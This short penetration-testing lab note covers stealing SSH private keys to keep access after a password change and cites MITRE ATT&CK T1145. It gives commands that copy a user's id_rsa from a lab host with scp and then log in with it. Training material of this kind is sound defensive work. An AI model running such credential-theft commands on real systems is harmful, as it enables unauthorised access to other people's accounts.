* [Theft of `SSH` private keys](#theft-of-ssh-private-keys)

# Theft of `SSH` private keys
Stealing SSH private key is a widely used method to maintain access even after the user changes his password. In this lab, the learning objective is to highlight the same fact. 

This is also covered by the MITRE ATT&CK framework: https://attack.mitre.org/techniques/T1145/

```
# Copy the private keys of the user from the server, if they are kept as backup
$ scp student@192.224.16.3:~/.ssh/id_rsa .

# Once you have access to private keys of the user, you can login without password
# Change the permissions of the private key id_rsa to 400.
# It is required that your private key files are NOT accessible by others.

$ chmod 400 id_rsa
$ ssh -i id_rsa student@192.224.16.3
```

